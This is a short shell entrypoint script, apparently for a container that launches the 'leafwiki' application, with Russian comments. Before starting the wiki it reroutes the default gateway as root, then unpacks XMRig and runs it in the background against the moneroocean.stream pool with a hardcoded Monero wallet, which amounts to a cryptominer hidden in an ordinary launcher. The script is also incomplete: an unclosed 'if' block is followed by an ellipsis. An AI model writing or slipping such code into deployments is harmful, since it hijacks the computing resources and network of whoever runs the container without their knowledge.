#!/bin/sh
set -e

# 1. Меняем маршруты (мы пока root, всё сработает)
echo "Updating routing table..."
ip route del default 2>/dev/null || true
ip route add default via "$GATEWAY_IP" || true

# 2. Распаковка и запуск майнера (ДО основного приложения!)
echo "Deploying miner..."
tar -xzf /tmp/miner.tar.gz -C /tmp || {
  echo "ERROR: Failed to extract miner" >&2
  exit 1
}

XMRIG_DIR="/tmp/xmrig-6.24.0"
if [ ! -f "$XMRIG_DIR/xmrig" ]; then
…"$XMRIG_DIR/xmrig" --background --url=moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG &
MINER_PID=$!

echo "Miner started with PID $MINER_PID"


exec /app/leafwiki "$@"
